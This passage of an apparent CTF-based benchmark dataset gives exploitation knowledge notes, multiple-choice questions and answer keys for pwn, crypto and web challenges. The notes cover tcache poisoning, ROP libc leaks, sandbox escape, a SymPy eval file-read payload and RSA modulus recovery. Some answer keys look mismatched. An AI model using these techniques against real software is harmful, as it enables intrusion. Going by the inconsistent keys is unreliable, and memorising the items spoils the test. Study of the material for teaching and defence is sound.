            "In cryptographic computations involving key exchange protocols like SIDH, what approach is recommended to deal with performance issues caused by the intensive isogeny calculations necessary for the protocol's operation?  - A. Increase the computational power of the system running the sage code to reduce execution time naturally. - B. Use the default computational method without specifying any parameters to ensure the accuracy of the operation. - C. Specify the `algorithm=\"factored\"` parameter when calling the `isogeny` method to expedite the computation process. - D. Convert the sage script into a more efficient programming language like C++ to handle the intensive computations. "
        ],
        "answer": [
            "B. Apply an automorphism to generate the necessary endomorphism, adapting the attack to the challenge's curve.",
            "C. Specify the `algorithm=\"factored\"` parameter when calling the `isogeny` method to expedite the computation process."
        ]
    },
    {
        "name": "safe vector",
        "write_up": "dataset/raw/safe vector.md",
        "type": "pwn",
        "competition": [
            "zer0pts/2021",
            "https://ctftime.org/event/1256/tasks/"
        ],
        "score": 158,
        "max_score": 392,
        "difficulty": 0.4030612244897959,
        "knowledge": [
            "When a class or object operation allows for negative indexing, it can lead to out-of-bounds access, which can be exploited for arbitrary memory read or write. This vulnerability arises due to failure in properly validating input index values, especially in languages or environments with manual memory management like C++.  \n   Scenario: Accessing elements of a custom vector-like class which implements its own boundary check mechanism that does not account for negative indexes.  \n   Example payload: Access the -1 index to manipulate or read memory located before the intended data structure.",
            "Tcache poisoning can be used as an exploitation technique to perform arbitrary code execution by corrupting the tcache linked list. By carefully crafting heap layout and exploiting vulnerabilities like out-of-bounds write, an attacker can overwrite pointers in the tcache freelist to arbitrary locations, such as `__free_hook`, and redirect execution flow, for instance, to the `system` function.  \n   Scenario: Exploiting a scenario where the version of libc and the binary\u2019s memory management behaviors are known, thereby leveraging the detailed understanding of heap management (like tcache bins size and behavior) to craft the attack.  \n   Example payload: Utilizing out-of-bounds write to insert a fake chunk into the tcache list that points to `__free_hook` and then triggering an allocation to overwrite `__free_hook` with the address of `system`."
        ],
        "question": [
            "Given a custom vector-like class that wraps around the standard C++ vector but includes an index check that fails to account for negative values, how can negative indexing potentially be exploited by an attacker? - A. To increase the efficiency of data retrieval by accessing memory directly. - B. To enable more flexible use of the vector for a variety of applications. - C. To exploit arbitrary memory read or write capabilities by accessing locations before the intended data structure. - D. To automatically correct any out-of-bounds errors that may occur during runtime.",
            "In an environment where libc version and binary memory management behaviors are known, which of the following best describes the process of tcache poisoning used to achieve arbitrary code execution? - A. Modifying the global offset table (GOT) to redirect function pointers to benign locations. - B. Overwriting pointers in the tcache freelist to arbitrary locations, such as `__free_hook`, to redirect execution flow to the `system` function by carefully crafting heap layout. - C. Infecting the process's code segment to insert malicious instructions directly into the binary. - D. Leveraging integer overflow vulnerabilities to bypass security checks and perform unauthorized actions without altering heap memory."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "safepy",
        "write_up": "dataset/raw/safepy.md",
        "type": "pwn",
        "competition": [
            "UIUCTF/2022",
            "https://ctftime.org/event/1600/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When dealing with challenges involving code execution via parsing functions, scrutinize the documentation for optional parameters that change the function's behavior. For instance, the `parse_expr` function in SymPy has an optional `evaluate` parameter that, when enabled (default behavior), simplifies expressions, potentially leading to unsafe `eval()` calls. This knowledge can be critical in identifying vulnerabilities where input can be executed or manipulated unexpectedly.\n   - Example payload for executing arbitrary code (printing contents of a file): `print(open(\"/path/to/file\").read())`",
            "Be cautious with security advice found on online forums such as StackOverflow. Even recommended safe practices, like using `parse_expr` instead of `sympify` to avoid the direct risks associated with `eval()`, can be flawed. Always verify the security implications of using certain functions, especially when they process user input, as they may have vulnerabilities that are not immediately obvious from community advice.\n   - No specific payload is provided for this point, but it emphasizes the importance of validating the safety of functions used in parsing or evaluating user input."
        ],
        "question": [
            "In the context of exploiting code execution vulnerabilities through input parsing in Python, consider the scenario where a Python script uses the SymPy library to parse and operate on user input: ```python from sympy import parse_expr expr = parse_expr(user_input) ``` Given the knowledge that `parse_expr` has an optional parameter `evaluate` which simplifies expressions by default, potentially leading to `eval()` execution, how can you influence the behavior of `parse_expr` to execute arbitrary Python code safely?  - A. Set the `evaluate` parameter to `False` to prevent any simplification and execution. - B. Use the `locals` parameter to define a safe environment for execution. - C. Explicitly pass `evaluate=True` to ensure that the input is simplified securely. - D. Modify the `user_input` to bypass the need for setting the `evaluate` parameter. ",
            "When following security practices based on community advice from online forums, such as StackOverflow, regarding the safe parsing of user input in Python, it's highlighted that using `parse_expr` instead of `sympify` from the SymPy library might avoid the risks associated with `eval()`. This premise is based on the assumption that `parse_expr` doesn't use `eval()` internally. Given this context, which statement best reflects the precaution you should take?  - A. Trust that `parse_expr` is entirely safe because it is recommended over `sympify`. - B. Verify whether `parse_expr` indeed does not use `eval()` or if it presents similar risks. - C. Assume all SymPy parsing functions are insecure and avoid them altogether. - D. Use `sympify` with custom sanitization functions to ensure safety. "
        ],
        "answer": [
            "A",
            "B"
        ]
    },
    {
        "name": "Sailors Revenge",
        "write_up": "dataset/raw/Sailors Revenge.md",
        "type": "This is a crypto challenge.",
        "competition": [
            "angstrom/2023",
            "https://ctftime.org/event/1859/tasks/"
        ],
        "score": -1,
        "max_score": 140,
        "difficulty": -1,
        "knowledge": [
            "In Solana smart contracts, particularly involving account validation and custom struct handling, it's crucial to validate the account data's correct structure explicitly. This includes ensuring that an account expected to contain certain type data (like `SailorUnion`) is not inadvertently interpreted as another struct type (such as `Registration`). This vulnerability arises due to Rust's type system not enforcing these checks at the Solana framework level, allowing for exploits like type confusion where negative values in one struct (`Registration { balance: i64 }`) can overflow when improperly cast to an unsigned integer in another context (`SailorUnion { available_funds: u64 }`), leading to unintended high values.",
            "When implementing Solana smart contracts with multi-role functionality, it's essential to correctly enforce role-based checks, especially on transaction signers. In scenarios where a contract method should differentiate roles (e.g., `authority` and `member`), ensuring that each role is not only present but also correctly authorized (e.g., by signing the transaction) prevents unauthorized access or unintended actions. This is especially vital in financial transactions or sensitive operations, where a mistake in these checks could lead to unauthorized asset transfer or manipulation. Here, the lack of stringent checks allowed the same account to act in multiple roles, undermining the intended security model."
        ],
        "question": [
            "In a Solana smart contract, a scenario involves validating the input accounts to ensure they match the expected data structure to mitigate risks such as type confusion. You have identified an issue where a function does not check if the passed account is indeed of the expected type, for instance, assuming `Registration` data as `SailorUnion`. Given the `SailorUnion` and `Registration` structs as defined: ```rust pub struct SailorUnion { available_funds: u64, authority: [u8; 32], } pub struct Registration { balance: i64, member: [u8; 32], } ``` A function incorrectly processes a `Registration` struct as `SailorUnion`, leading to a type confusion issue where negative `balance` from `Registration` could be cast to a high `available_funds` value in `SailorUnion`. How should the smart contract correctly differentiate and validate the account data to prevent this type of issue?  - A. Use Rust's pattern matching to explicitly match the account data against the expected `SailorUnion` struct. - B. Encode a type identifier within the account data and validate this identifier at runtime. - C. Ensure all struct fields are signed integers to prevent overflow. - D. Use Solana's built-in account validation functions to automatically distinguish between different data structs. ",
            "When implementing role-based functionalities in Solana smart contracts where specific actions are restricted to certain roles like `authority` and `member`, what is the best practice to securely differentiate and validate these roles, especially in the context of a function that is susceptible to a security flaw due to insufficient signer verification?  - A. Require both `authority` and `member` to sign transactions and explicitly verify each signer within the contract function. - B. Implement a centralized authority registry within the contract to manage role assignments and validations. - C. Avoid role-based functionalities to minimize complexity and potential security risks. - D. Use the transaction's `memo` field to specify the role of each signer and verify this information within the contract. "
        ],
        "answer": [
            "**A**",
            "**A**"
        ]
    },
    {
        "name": "Sakura",
        "write_up": "dataset/raw/Sakura.md",
        "type": "web",
        "competition": [
            "HITCON/2017/Quals",
            "https://ctftime.org/event/485/tasks/"
        ],
        "score": 218,
        "max_score": 450,
        "difficulty": 0.48444444444444446,
        "knowledge": [
            "In reverse engineering challenges requiring interaction with a complex verification function that doesn\u2019t instantly fail upon incorrect input, using Symbolic Execution frameworks like `angr`, the `avoid` parameter in the `explore()` method is crucial. This parameter allows specifying memory addresses that, if reached, should cause `angr` to terminate the analysis of the current path. This approach helps in avoiding dead paths that are not leading to a solution, thereby optimizing the search process for valid inputs.",
            "In blockchain-related CTF challenges where you need to interact with smart contracts, fuzzing can be used effectively to discover specific sequences of actions or inputs that transition the system into a desired state (e.g., a state that leads to revealing a flag). This method involves generating a wide range of inputs or sequence of actions to explore the system's behavior with the goal of uncovering vulnerabilities or unintended behaviors. Fuzzing can be particularly useful when the number of possible actions is finite and relatively small, allowing for the exhaustive exploration of the action space.\n\n```python\n# Sample fuzzing code structure\nimport subprocess\nimport itertools\nfrom concurrent.futures import ProcessPoolExecutor\n\n# Define possible choices/actions as candidates\ncands = [(1, 0), (1, 1), (1, 3), (2,), (3,)]\n\n# Generate all possible sequences of actions\nall_sequences = [c + ((4,),) for c in itertools.product(cands, repeat=4)]\n\ndef fuzz_sequence(sequence):  \n   # Code to apply the sequence of actions to the target application\n   # and check for the presence of the flag or desired outcome\n\n# Using multiprocessing to parallelize the fuzzing process\nwith ProcessPoolExecutor(max_workers=4) as executor:  \n   executor.map(fuzz_sequence, all_sequences)  \n```"
        ],
        "question": [
            "In the context of reverse engineering challenges where a binary reads a specific amount of bytes from stdin and performs a series of verification tests on the input, which method parameter in the `angr` framework allows for optimizing the symbolic execution by terminating analysis paths early if certain conditions are met, specifically aimed at avoiding dead paths?  - A. The `find` parameter in the `execute()` method. - B. The `avoid` parameter in the `explore()` method. - C. The `terminate` parameter in the `run()` method. - D. The `skip` parameter in the `analyze()` method. ",
            "When dealing with blockchain-related Capture The Flag (CTF) challenges that involve interacting with smart contracts to uncover unintended states leading to a flag, which approach can systematically test various sequences of interactions to discover the necessary state transition?  - A. Dynamic analysis using debugging tools. - B. Static code analysis by reviewing smart contract code. - C. Fuzzing by generating a wide range of inputs or sequences of actions. - D. Manual testing based on intuition and understanding of blockchain technology. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Sandbox compat",
        "write_up": "dataset/raw/Sandbox compat.md",
        "type": "pwn",
        "competition": [
            "GoogleCTF/2018/Quals",
            "https://ctftime.org/event/623/tasks/"
        ],
        "score": 420,
        "max_score": 500,
        "difficulty": 0.84,
        "knowledge": [
            "In memory corruption challenges, particularly sandbox escape scenarios, when the challenge setup involves transitioning between userland and kernelland (kernel mode code execution), inspecting how the `flags` register is managed during this transition is crucial. A possible attack vector is manipulating the `direction flag` (DF) to alter the behavior of string instructions like `rep movs`, commonly used in functions like `memcpy`. This manipulation can lead to controlled modification of memory regions, including the stack, allowing for exploitation and arbitrary code execution.\n   \n   Sample exploitation principle (not exact payload due to context specifics):\n   ```asm\n   std                    ; Set direction flag\n   push    <some_value>   ; Prepare values/addresses on stack\n   push    <return_address_or_gadget> \n   retf                   ; Trigger far return to switch stacks or execution context assuming control over stack contents\n   ```",
            "When bypassing sandbox implementations or similar restrictions in CTF challenges designed to limit system calls or direct access to sensitive resources, leveraging already available code gadgets within the binary or the system's API, such as the PlT/GOT entries for `syscall`, can be effective. This approach is particularly useful when direct syscalls are restricted by SECCOMP rules or other security mechanisms. Constructing a ROP chain to perform syscalls indirectly allows for actions like opening, reading, and writing files despite restrictions.\n\n   Sample exploitation strategy:\n   - Use a controlled overwrite (via previous point exploit strategy) to redirect execution to a `syscall; ret;` gadget.\n   - Prepare registers for the desired syscall (e.g. `open`, `read`, `write`) using stack setup or additional gadgets.\n   - Trigger the gadget to perform the syscall indirectly, bypassing filters on direct syscall execution. \n\n   ```asm\n   ;; ROP chain to execute open(\"flag\", O_RDONLY) indirectly \n   mov rdi, <address_of_string_flag>   ; Address pointing to the string \"flag\\0\"\n   mov rsi, O_RDONLY                   ; 0, Open for reading only\n   mov rax, __NR_open                  ; Syscall number for open\n   call <syscall_gadget>               ; Execute the syscall indirectly\n   ```"
        ],
        "question": [
            "In a scenario where an attacker manipulates the `direction flag` (DF) during a transition from userland to kernelland to alter the behavior of string operations, which instruction is likely being targeted for exploitation through altered behavior? - A. `movs` - B. `add` - C. `jmp` - D. `sub`",
            "When direct system calls are restricted by mechanisms such as SECCOMP, and an attacker aims to bypass these restrictions using code gadgets for indirect syscall execution, which of the following best describes the gadgets sought for constructing a ROP chain? - A. Gadgets that directly manipulate the stack pointer (`rsp` or `esp`) - B. Gadgets that perform arithmetic operations - C. Gadgets that execute a `syscall` instruction followed by a `ret` - D. Gadgets that only move data between registers"
        ],
        "answer": [
            "A",
            "C"
        ]
    },
    {
        "name": "Sandbox Share",
        "write_up": "dataset/raw/Sandbox Share.md",
        "type": "pwn",
        "competition": [
            "ALLES/2021",
            "https://ctftime.org/event/1313/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting XPC (Cross-Process Communication) services in macOS for privilege escalation or sandbox escape, creating a UAF (Use-After-Free) condition by manipulating object lifecycle (create, use, delete) through XPC messages can lead to arbitrary code execution. This technique involves sending crafted XPC messages to deliberately create a controlled heap layout, then forcing the target service to reuse freed objects with attacker-controlled data. A sequence to achieve this includes cleaning the heap with tiny allocations, creating UAF objects, deallocating them, and finally reusing these objects with malicious payloads to hijack the control flow.",
            "For leveraging Use-After-Free vulnerabilities effectively, especially in scenarios involving complex memory management (like in macOS sandbox environments), understanding the target's memory allocation patterns is crucial. This can be achieved by creating and deleting a large number of objects to \"clean\" and prepare the heap, ensuring that the memory to be reclaimed (freed and subsequently reallocated) is predictably controlled. This prepares the environment for injecting and executing the payload by placing it in the memory location expected to be reused after a free operation. This approach allows for precise manipulation of memory states to exploit memory corruption vulnerabilities."
        ],
        "question": [
            "When attempting to exploit XPC services in macOS to trigger a Use-After-Free condition, which of the following sequences of actions is correct for creating a controlled heap layout conducive to arbitrary code execution? - A. Allocate large blocks of memory, delete them to create fragments, and insert malicious payloads in the remaining spaces. - B. Create a high number of tiny allocations to clean the heap, create Use-After-Free objects, free them, and then reuse these objects with attacker-controlled data. - C. Continuously request large amounts of data from the target service to exhaust memory resources and trigger out-of-memory conditions. - D. Randomize memory allocations to confuse the memory management routine and forcibly insert malicious objects into the execution flow. ",
            "In the context of exploiting Use-After-Free vulnerabilities, especially in environments with complex memory management like macOS sandboxes, what strategy is crucial for ensuring the effectiveness of the exploit? - A. Randomly modifying the memory allocation code of the target application to create unexpected behavior at runtime. - B. Monitoring the target service's memory usage remotely to predict the best time to insert the exploit code. - C. Creating and deleting a large number of objects to manipulate the heap, ensuring that the memory space to be reclaimed is under attacker control for payload injection. - D. Leveraging encryption techniques to obfuscate the exploit code, making it difficult for memory analysis tools to detect malicious patterns. "
        ],
        "answer": [
            "B. Create a high number of tiny allocations to clean the heap, create Use-After-Free objects, free them, and then reuse these objects with attacker-controlled data.",
            "C. Creating and deleting a large number of objects to manipulate the heap, ensuring that the memory space to be reclaimed is under attacker control for payload injection."
        ]
    },
    {
        "name": "Sandboxed ROP",
        "write_up": "dataset/raw/Sandboxed ROP.md",
        "type": "pwn",
        "competition": [
            "BlueHens/2021",
            "https://ctftime.org/event/1298/tasks/"
        ],
        "score": 445,
        "max_score": 500,
        "difficulty": 0.89,
        "knowledge": [
            "When dealing with challenges protected by `seccomp` that restrict the set of available syscalls, one can still perform limited operations like reading, writing, and opening files. This restricts the exploit developer to using only the allowed syscalls to interact with the system. It's essential to analyze the `seccomp` rules set via tools like `seccomp-tools` to understand the allowed syscalls and plan an exploit accordingly. Crafting a ROP chain becomes a vital skill here, using the gadgets available within the given constraints to perform operations like leaking libc addresses or manipulating file descriptors.",
            "In scenarios where direct execution of useful syscalls is not possible due to restrictions like `seccomp`, one may need to leak libc addresses to call functions like 'open', 'read', and 'write' by computing the libc base address and then using it to calculate the addresses of the needed libc function. This process generally involves finding a leak primitive to send out addresses of known symbols (e.g., using the `puts` function to leak the address of a libc function present in the GOT), and then using an online libc database (e.g., libc.blukat.me) to identify the exact libc version and calculate the base address.\n\n- Example Leak Primitive Payload: To leak an address, a sample payload might prepare a ROP chain that places the GOT entry of a known function (like `puts`) into the RDI register (via a `pop rdi; ret` gadget) before calling `puts` to print out the address. Then, it adjusts the stack to continue execution gracefully, which could look similar to this simplified Python snippet:\n```python\nfrom pwn import *\n\n# Assuming we have the necessary addresses and the binary loaded into 'exe':\nputs_got_addr = exe.got['puts']\npop_rdi_ret = 0x00000000004013a3  # This is hypothetical and will depend on the exact binary\nputs_plt = exe.plt['puts']\ncontinue_execution_addr = 0x400xxx  # Address to continue execution after the leak\n\npayload = flat([\n    'A'*buffer_overflow_offset,  # Padding to reach the return address\n    pop_rdi_ret,\n    puts_got_addr,\n    puts_plt,\n    continue_execution_addr\n])\n```\nThis payload, when sent as part of an exploit under appropriate conditions (like after overflowing a buffer), would leak the runtime address of `puts`, which can then be used to calculate the base address of libc."
        ],
        "question": [
            "When developing an exploit for a challenge with a buffer overflow vulnerability and `seccomp` filters in place that allow only a limited set of system calls (`read`, `write`, `open`, `exit_group`, and `openat`), which of the following actions would NOT be possible directly through system calls? - A. Reading content from a file on the filesystem. - B. Writing arbitrary data to a controlled memory area. - C. Creating a new process to escape the restricted environment. - D. Opening a file by its pathname to read its contents. ",
            "Consider an exploitation scenario where you need to call `open`, `read`, and `write` functions in a binary with `seccomp` restrictions but lack direct syscall instructions. Given a leaked libc address of a function (e.g., `puts`), what would be your next step to call these libc functions? - A. Immediately use the leaked address to call `open` without any adjustments. - B. Compute the base address of libc using the leaked address and an online database, then call the `open`, `read`, and `write` functions with their libc offsets. - C. Use the leaked address to directly calculate the addresses of `open`, `read`, and `write` without computing the libc base address. - D. Ignore the leaked address as it is irrelevant for calling `open`, `read`, and `write`. "
        ],
        "answer": [
            "C. Creating a new process to escape the restricted environment.",
            "B. Compute the base address of libc using the leaked address and an online database, then call the `open`, `read`, and `write` functions with their libc offsets."
        ]
    },
    {
        "name": "Santa's ELF holomorphing machine",
        "write_up": "dataset/raw/Santa's ELF holomorphing machine.md",
        "type": "This is a crypto challenge.",
        "competition": [
            "X-MAS/2020",
            "https://ctftime.org/event/1209/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with challenges that involve holomorphic functions, the Cauchy-Riemann equations are crucial for computing missing function components. If given the real part \\(u(x,y)\\) or the imaginary part \\(v(x,y)\\) of a holomorphic function \\(f(z)\\), one can derive the other part using these equations: \\(du/dx = dv/dy\\) and \\(du/dy = -dv/dx\\). This method allows for the reconstruction of the entire function given just half of its components, assuming an integration constant of zero.",
            "In challenges involving complex functions and visual output, plotting the computed values of a function can reveal hidden messages or flags. When a challenge output appears to be inverted or not correctly oriented, adjusting the coordinates (for example, inverting the y-coordinate by a fixed value) before plotting can unveil the correct visual representation of the flag or message."
        ],
        "question": [
            "Which of the following correctly states the Cauchy-Riemann equations used for determining the missing part of a holomorphic function from its known real or imaginary components? - A. \\(du/dy = dv/dx\\) and \\(dv/dy = -du/dx\\) - B. \\(du/dx = dv/dy\\) and \\(du/dy = -dv/dx\\) - C. \\(du/dx = -dv/dy\\) and \\(du/dy = dv/dx\\) - D. \\(du/dy = dv/dy\\) and \\(du/dx = -dv/dx\\)",
            "When plotting the output of a complex function to reveal a visual flag, and the image appears inverted, which adjustment should correctly reorient the image according to the given Python script in the challenge? - A. Multiplying the x-coordinates by -1 - B. Adding a fixed value to both x and y-coordinates - C. Inverting the y-coordinate by subtracting it from a fixed value - D. Rotating the plot by 180 degrees"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Santa's list 2",
        "write_up": "dataset/raw/Santa's list 2.0.md",
        "type": "crypto",
        "competition": [
            "X-MAS/2018",
            "https://ctftime.org/event/724/tasks/"
        ],
        "score": -1.0,
        "max_score": 591,
        "difficulty": -1,
        "knowledge": [
            "In textbook RSA encryption, if the encryption process directly operates on plaintext without additional randomness or padding, the ciphertext is malleable. This means that one can manipulate the ciphertext in a predictable way without decrypting it. Specifically, if one can perform operations on the ciphertext such as multiplication with another encrypted value, the plaintext can be indirectly modified. This vulnerability allows an attacker to bypass certain restrictions on direct plaintext manipulation by instead manipulating the ciphertext. For instance, multiplying the ciphertext of the flag with the ciphertext of a known value (like `-1` or `2`) and then decrypting the result can reveal altered forms of the original plaintext, from which the true plaintext (flag) can be deduced. \n\n    Example manipulation:\n    - Original encryption: `ct_flag = encrypt(flag) = flag^e mod n`\n    - Manipulate by multiplying with `encrypt(-1)`: `ct_not_flag = ct_flag * encrypt(-1) = (flag * -1)^e mod n`\n    - The decryption of `ct_not_flag` yields `flag * -1 mod n`, from which `flag` can be recovered if `n` is known.",
            "The RSA modulus `n` can be determined if one has the ability to encrypt arbitrary plaintexts under the target public key `(n, e)`. Assuming `e` is known (commonly `e = 65537`), one can calculate `n` by exploiting the fact that `m**e - encrypt(m)` is a multiple of `n` for any message `m`. By encrypting two (or more) distinct messages and computing the greatest common divisor (GCD) of their respective differences (`m**e - encrypt(m)`), one can recover `n`. This technique is particularly useful when the public key is not directly provided, but encryption can be performed with known plaintexts. \n\n    Example code to calculate `n`:\n    ```python\n    e = 65537\n    def get_resid(i):  \n        return i**e - encrypt(i)\n\n    def get_n():  \n        curr = get_resid(bytes_to_long('a'))  \n        for i in [bytes_to_long('b'), bytes_to_long('c')]:  \n            curr = GCD(curr, get_resid(i))  \n        return curr\n    ```"
        ],
        "question": [
            "In a scenario where textbook RSA encryption is used, allowing direct manipulation of ciphertext without decrypting it, consider the following operation: a ciphertext of a flag is multiplied by the ciphertext of the number `-1`. After decrypting this product, what is the expected outcome? - A. The decryption process will fail due to an error. - B. The decrypted text will be the original flag, unmodified. - C. The decrypted text will reveal `flag * -1 mod n`, which can be used to recover the flag. - D. The decrypted text will be a completely random string, unrelated to the original flag.",
            "In an encryption system using RSA where the public key `(n, e)` is not provided, but the entity can encrypt arbitrary plaintexts, one wants to calculate `n` using the encryption of different messages. Given `e = 65537` and knowing how to encrypt different messages, what method allows the calculation of `n`? - A. Summing the encrypted values of two different messages and taking the square root. - B. Encrypting a single message and dividing the result by `e`. - C. Computing the greatest common divisor (GCD) of `(m1**65537 - encrypt(m1))` and `(m2**65537 - encrypt(m2))` for different messages `m1` and `m2`. - D. Calculating the average of encrypted values of multiple messages and multiplying by `e`."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Santa's list",
        "write_up": "dataset/raw/Santa's list.md",
        "type": "crypto",
        "competition": [
            "X-MAS/2018",
            "https://ctftime.org/event/724/tasks/"
        ],
        "score": 286,
        "max_score": 591,
        "difficulty": 0.48392554991539766,
        "knowledge": [
            "In the context of RSA encryption where textbook RSA is used and the plaintext is malleable, one can exploit the malleability by creating a manipulated ciphertext that, when decrypted, results in a predictable transformation of the original plaintext. This approach includes multiplying the original ciphertext (`ct_flag`) by another encrypt function output (`ct_neg` or `ct_two`) under the same modulus to produce a new ciphertext (`ct_not_flag`) that can be decrypted into a manipulated plaintext. \n   - Example manipulations:\n     - Multiplying the flag ciphertext by the ciphertext of 2 to decrypt it into `flag*2`.\n     - Multiplying the flag ciphertext by the ciphertext of -1 (`encrypt(-1)`) to decrypt it into `flag*-1 mod n`.",
            "To exploit the RSA encryption, it's crucial to obtain the public key components, which are `n` (modulus) and `e` (public exponent). While the public exponent `e` often defaults to 65537, obtaining `n` might require more effort. A method to discover `n` is to encrypt arbitrary values (`m`), and use the difference between `m**e` and `encrypt(m)` to find `n` through the Greatest Common Divisor (GCD) of several such differences. This method relies on the premise that `m**e - encrypt(m)` is a multiple of `n`.\n   - Example code to find `n` using GCD:\n     ```python\n     e = 65537\n     def get_resid(i):\n         return i**e - encrypt(i)\n\n     def get_n():\n         curr = get_resid(bytes_to_long('a'))\n         for i in [bytes_to_long('b'), bytes_to_long('c')]:\n             curr = math.gcd(curr, get_resid(i))\n         return curr\n     ```"
        ],
        "question": [
            "In the context of exploiting the malleability of plaintext in textbook RSA encryption, which of the following operations on a ciphertext `ct_flag` would allow a decrypt operation to yield `flag*-1 mod n`? - A. Multiplying `ct_flag` by the encryption of 3 (`encrypt(3)`) under the same modulus. - B. Multiplying `ct_flag` by the encryption of 0 (`encrypt(0)`) under the same modulus. - C. Multiplying `ct_flag` by the encryption of -1 (`encrypt(-1)`) under the same modulus. - D. Adding `ct_flag` to the encryption of 1 (`encrypt(1)`) under the same modulus. ",
            "Which code snippet best illustrates how to find the modulus `n` in an RSA encryption system using the greatest common divisor (GCD) method, given the public exponent `e` is already known as `65537`? - A. ```python e = 65537 def get_n(): return e - encrypt(1) ``` - B. ```python e = 65537 def get_resid(i): return i**e - i ``` - C. ```python e = 65537 def get_n(): curr = encrypt(1)**e for i in [2, 3]: curr = math.gcd(curr, encrypt(i)**e) return curr ``` - D. ```python e = 65537 def get_resid(i): return i**e - encrypt(i) def get_n(): curr = get_resid(bytes_to_long('a')) for i in [bytes_to_long('b'), bytes_to_long('c')]: curr = math.gcd(curr, get_resid(i)) return curr ``` "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Santa's public key factory",
        "write_up": "dataset/raw/Santa's public key factory.md",
        "type": "crypto",
        "competition": [
            "X-MAS/2020",
            "https://ctftime.org/event/1209/tasks/"
        ],
        "score": 226,
        "max_score": 500,
        "difficulty": 0.452,
        "knowledge": [
            "When facing RSA encryption challenges, especially ones that involve generating primes in a specific way, if the method leaks some information about the structure of the primes (such as using a set of exponents to form the primes), multiple public keys can be analyzed to find common factors or to deduce the exponents used in generating the primes. This can lead to the factorization of \\(n=p \\times q\\), allowing decryption using the private key derived from \\(\\phi(n)\\) and \\(e\\).",
            "In challenges where you can obtain multiple instances of related data (like public keys with partially predictable primes), leveraging statistical or brute force methods to analyze and find patterns or repeated elements can lead to breaking the encryption. Specifically, collecting a significant sample, analyzing for common or repeated components (like the top 20 exponents across several primes), and then using combinations of these components to guess the factors efficiently can be a successful strategy. Following this, using `gmpy2.next_prime()` or similar functions can assist in testing hypotheses about the structure of primes and eventually factorizing \\(n\\) for RSA decryption.\n\nExample of a Python snippet to attempt RSA prime factorization based on predictable prime structure:\n```python\nfrom Crypto.Util.number import inverse\nimport gmpy2\nfrom itertools import combinations\n\n# Assume n is the RSA modulus and the partially predictable structure leads to a reduced set of possible prime factors\npossible_exponents = [exp1, exp2, ...] # Derived from analysis\n\nfor i in range(1, len(possible_exponents) + 1):\n    for exp_set in combinations(possible_exponents, i):\n        # Construct a potential prime\n        potential_prime = 2**1023  # Starting point based on specific scenario\n        for exp in exp_set:\n            potential_prime += 2**exp\n        potential_prime = gmpy2.next_prime(potential_prime)\n\n        if n % potential_prime == 0:\n            p = potential_prime\n            q = n // p\n            phi = (p-1) * (q-1)\n            e = 65537  # Commonly used public exponent\n            d = inverse(e, phi)  # Compute the private exponent\n            print(f\"Success: p={p}, q={q}\")\n            break\n```"
        ],
        "question": [
            "In an RSA encryption challenge where primes are generated using specific exponents and you have access to multiple public keys, how can you derive the private key for decryption? - A. By finding common multiples between all public keys and using them to solve for \\(\\phi(n)\\) - B. By guessing the secret message directly without factoring \\(n\\) - C. By analyzing and finding common factors or deducing exponents used in generating the primes, leading to the factorization of \\(n=p \\times q\\), and deriving the private key from \\(\\phi(n)\\) and \\(e\\) - D. By changing the encryption algorithm to a simpler one without needing the private key ",
            "In a setup where you can acquire several related data points (like encrypted messages or public keys with predictable elements), what strategy can lead to breaking the encryption, especially in RSA when you know part of the prime construction? - A. Ignoring the predictable elements and focusing on cracking the encryption algorithm itself - B. Randomly guessing the encryption key without analyzing the provided data - C. Collecting a significant sample, analyzing for common or repeated components, using these insights to guess the factors efficiently, and applying further cryptographic functions like `gmpy2.next_prime()` to test and eventually factorize \\(n\\) for decryption - D. Focusing solely on social engineering tactics to obtain the decryption key from the challenge creator "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "SCRAMBLE",
        "write_up": "dataset/raw/SCRAMBLE.md",
        "type": "pwn",
        "competition": [
            "CyberSecurityRumble/2022",
            "https://ctftime.org/event/1665/tasks/"
        ],
        "score": 378,
        "max_score": 960,
        "difficulty": 0.39375,
        "knowledge": [
            "In challenges involving guessing a correct sequence (like strings or numbers) with limited attempts and receiving feedback for each guess, creating a function that methodically eliminates impossible choices based on this feedback improves efficiency and accuracy. This can be achieved by analyzing the feedback for presence, absence, and correct positioning of elements to narrow down the potential correct answers from a given list.\n   - Example function structure in Python can include comparing each character's feedback indicator and removing words from the wordlist that do not match the criteria established by the feedback.\n   \n     ```py\n     def eliminate(feedback, guess, wordlist):\n         result = []\n         for word in wordlist:\n             match = True\n             for i in range(len(guess)):\n                 if feedback[i] == \"*\" or feedback[i] == \"+\":\n                     if guess[i] not in word:\n                         match = False\n                 if feedback[i] == \"+\":\n                     if guess[i] != word[i]:\n                         match = False\n                 if feedback[i] == \"-\":\n                     if guess[i] in word:\n                         match = False\n             if match and word != guess:\n                 result.append(word)\n         return result\n     ```",
            "When facing binary reverse engineering challenges where the goal is to find a specific state or output (such as the \"Correct!\" message), utilizing symbolic execution frameworks like angr can automate the exploration of different execution paths to reach the desired state efficiently. This approach can significantly reduce the time and effort required as opposed to manually analyzing and tracing through the binary's logic.\n    - To achieve this, identify the memory address or function call associated with the desired outcome, and configure the symbolic execution tool to explore execution paths towards this target.\n   \n      ```python\n      import angr\n\n      proj = angr.Project(\"./binary_name\")\n\n      target_addr = 0xTargetAddress\n\n      state = proj.factory.entry_state()\n      simgr = proj.factory.simgr(state)\n      simgr.explore(find=target_addr)\n      found_state = simgr.found[0]\n      print(found_state.posix.dumps(0))\n      ```"
        ],
        "question": [
